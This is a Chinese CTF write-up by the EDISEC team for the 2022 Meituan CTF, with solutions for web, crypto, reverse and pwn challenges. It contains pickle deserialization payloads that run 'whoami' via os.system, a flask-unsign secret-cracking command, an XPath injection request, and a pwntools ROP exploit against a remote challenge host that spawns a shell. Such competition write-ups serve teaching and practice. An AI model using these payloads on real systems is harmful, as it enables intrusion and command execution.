# 第五届2022美团CTF-WriteUp By EDISEC

> 原文: https://www.ctfiot.com/57488.html
> ID: 57488

点击蓝字 ·  关注我们

01

Web

1

easypickle

import base64import pickle
from flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices("admin", k=5))    return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != "admin": return f"<script>alert('Access Denied');window.location.href='/'</script>" else: try: a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError("R i o b is forbidden") pickle.loads(base64.b64decode(session.get('ser_data'))) return "ok" 
except:            return "error!"if __name__ == '__main__':    app.run(host='0.0.0.0', port=8888)

flask-unsign -u -c "eyJ1c2VyIjoibmlpbWQifQ.YyWuLQ.0cA5d6Yw0YLgq2_-ONSmWixQO0o" --wordlist /test/1.txt --no-literal-eval

b'''(cos system S'whoami' o.'''

b'''(cos system S'whoami' os.'''

b'''(cOs system S'whoami' Os.'''

2

babyjava

POST /hello HTTP/1.1Host: eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888Content-Length: 67Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closexpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='

02

Crypto

1

strange_rsa1

1035417307823962863562692014605988754210850910147854210810745714139032535689
0199583373894457500644181987484104714492532470944829664847264360542662124954
0771048129736947767868864747342626440475167260924133296899231005859892212025
9940804922095197051670288498112926299671514217457279033970326518832408003060
034369

import gmpy2p = 10354173078239628635626920146059887542108509101478542108107457141390325356890199583373894457500644181987484104714492532470944829664847264360542662124954077q = 10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369e = 0x10001s = (p-1)*(q-1)d = gmpy2.invert(e,s)m = pow(c,d,n)print(long_to_bytes(m))

03

Re

1

re_1 : small

#teafrom ctypes import *def decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x67452301     k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * 35) for i in range(35): v1.value -= ((v0.value<<4) + k2) ^ (v0.value + total.value) ^ ((v0.value>>5) + k3) v0.value -= ((v1.value<<4) + k0) ^ (v1.value + total.value) ^ ((v1.value>>5) + k1)         total.value -= delta    return v0.value, v1.value   from Crypto.Util.number import long_to_bytes
# testflag = b""if __name__ == "__main__":    tt = [0xDE087143, 0xC4F91BD2, 0xDAF6DADC, 0x6D9ED54C, 0x75EB4EE7, 0x5D1DDC04, 0x511B0FD9, 0x51DC88FB] for i in range(0,8,2): value = [tt[i],tt[i+1]] key = [0x1, 0x23, 0x45, 0x67] res = decrypt(value, key) # print("Decrypted data is : ", hex(res[0]), hex(res[1])) flag += (long_to_bytes(res[0]))[::-1]        flag += (long_to_bytes(res[1]))[::-1]print(flag)print(len(flag))

04

Pwn

1

note

数组越界，修改该函数内的返回地址，直接ROP即可。

#!usr/bin/env python #coding=utf-8
from pwn import *context(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./note')DEBUG = 0if DEBUG: p = process('./note') libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')else: ip = '39.106.78.22' port = 13535 libc = ELF("./libc-2.31.so")    p = remote(ip, port)  def debug(info="b main"): gdb.attach(p, info)  #gdb.attach(p, "b *$rebase(0x)")def add(size, content): p.sendlineafter(b"5. leaven", b'1') p.recvuntil(b"Size: ") p.sendline(str(size).encode('ascii')) p.recvuntil(b"Content: ")    p.send(content)def edit(idx, content): p.sendlineafter(b"5. leaven", b'3') p.recvuntil(b"Index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"Content: ")    p.send(content)def show(idx): p.sendlineafter(b"5. leaven", b'2') p.recvuntil(b"Index: ")    p.sendline(str(idx).encode('ascii'))def free(idx): p.sendlineafter(b"5. leaven", b'4') p.recvuntil(b" ")    p.sendline(str(idx).encode('ascii'))pop_ret = 0x00000000004017b3for i in range(9): add(0x100, b'a')for i in range(8): free(i)add(0x80, b'deadbeef')show(0)p.recvuntil(b'deadbeef')leak = u64(p.recv(6).ljust(8, b'x00')) - 0x1ecce0log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))#debug()edit(-4, p64(0) + p64(0x000000000040101a) + p64(pop_ret) + p64(binsh) + p64(sys))p.interactive()

flag{24af657f-a24a-4bf9-9b9c-a5c76dfd5e54}

Tip

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）

有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
import base64import pickle
from flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices("admin", k=5))    return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != "admin": return f"<script>alert('Access Denied');window.location.href='/'</script>" else: try: a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError("R i o b is forbidden") pickle.loads(base64.b64decode(session.get('ser_data'))) return "ok" 
except:            return "error!"if __name__ == '__main__':    app.run(host='0.0.0.0', port=8888)
flask-unsign -u -c "eyJ1c2VyIjoibmlpbWQifQ.YyWuLQ.0cA5d6Yw0YLgq2_-ONSmWixQO0o" --wordlist /test/1.txt --no-literal-eval
b'''(cos system S'whoami' o.'''
b'''(cos system S'whoami' os.'''
b'''(cOs system S'whoami' Os.'''
POST /hello HTTP/1.1Host: eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888Content-Length: 67Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://eci-2zeetzz54w4b5lmj8qup.cloudeci1.ichunqiu.com:
8888/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closexpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='
1035417307823962863562692014605988754210850910147854210810745714139032535689
0199583373894457500644181987484104714492532470944829664847264360542662124954
0771048129736947767868864747342626440475167260924133296899231005859892212025
9940804922095197051670288498112926299671514217457279033970326518832408003060
034369
import gmpy2p = 10354173078239628635626920146059887542108509101478542108107457141390325356890199583373894457500644181987484104714492532470944829664847264360542662124954077q = 10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369e = 0x10001s = (p-1)*(q-1)d = gmpy2.invert(e,s)m = pow(c,d,n)print(long_to_bytes(m))
    #teafrom ctypes import *def decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x67452301     k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * 35) for i in range(35): v1.value -= ((v0.value<<4) + k2) ^ (v0.value + total.value) ^ ((v0.value>>5) + k3) v0.value -= ((v1.value<<4) + k0) ^ (v1.value + total.value) ^ ((v1.value>>5) + k1)         total.value -= delta    return v0.value, v1.value   from Crypto.Util.number import long_to_bytes
# testflag = b""if __name__ == "__main__":    tt = [0xDE087143, 0xC4F91BD2, 0xDAF6DADC, 0x6D9ED54C, 0x75EB4EE7, 0x5D1DDC04, 0x511B0FD9, 0x51DC88FB] for i in range(0,8,2): value = [tt[i],tt[i+1]] key = [0x1, 0x23, 0x45, 0x67] res = decrypt(value, key) # print("Decrypted data is : ", hex(res[0]), hex(res[1])) flag += (long_to_bytes(res[0]))[::-1]        flag += (long_to_bytes(res[1]))[::-1]print(flag)print(len(flag))
#!usr/bin/env python #coding=utf-8
from pwn import *context(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./note')DEBUG = 0if DEBUG: p = process('./note') libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')else: ip = '39.106.78.22' port = 13535 libc = ELF("./libc-2.31.so")    p = remote(ip, port)  def debug(info="b main"): gdb.attach(p, info)  #gdb.attach(p, "b *$rebase(0x)")def add(size, content): p.sendlineafter(b"5. leaven", b'1') p.recvuntil(b"Size: ") p.sendline(str(size).encode('ascii')) p.recvuntil(b"Content: ")    p.send(content)def edit(idx, content): p.sendlineafter(b"5. leaven", b'3') p.recvuntil(b"Index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"Content: ")    p.send(content)def show(idx): p.sendlineafter(b"5. leaven", b'2') p.recvuntil(b"Index: ")    p.sendline(str(idx).encode('ascii'))def free(idx): p.sendlineafter(b"5. leaven", b'4') p.recvuntil(b" ")    p.sendline(str(idx).encode('ascii'))pop_ret = 0x00000000004017b3for i in range(9): add(0x100, b'a')for i in range(8): free(i)add(0x80, b'deadbeef')show(0)p.recvuntil(b'deadbeef')leak = u64(p.recv(6).ljust(8, b'x00')) - 0x1ecce0log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))#debug()edit(-4, p64(0) + p64(0x000000000040101a) + p64(pop_ret) + p64(binsh) + p64(sys))p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663551455.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663551456.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/0-1663551457.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/1-1663551457.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/10-1663551458.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/5-1663551459.jpeg)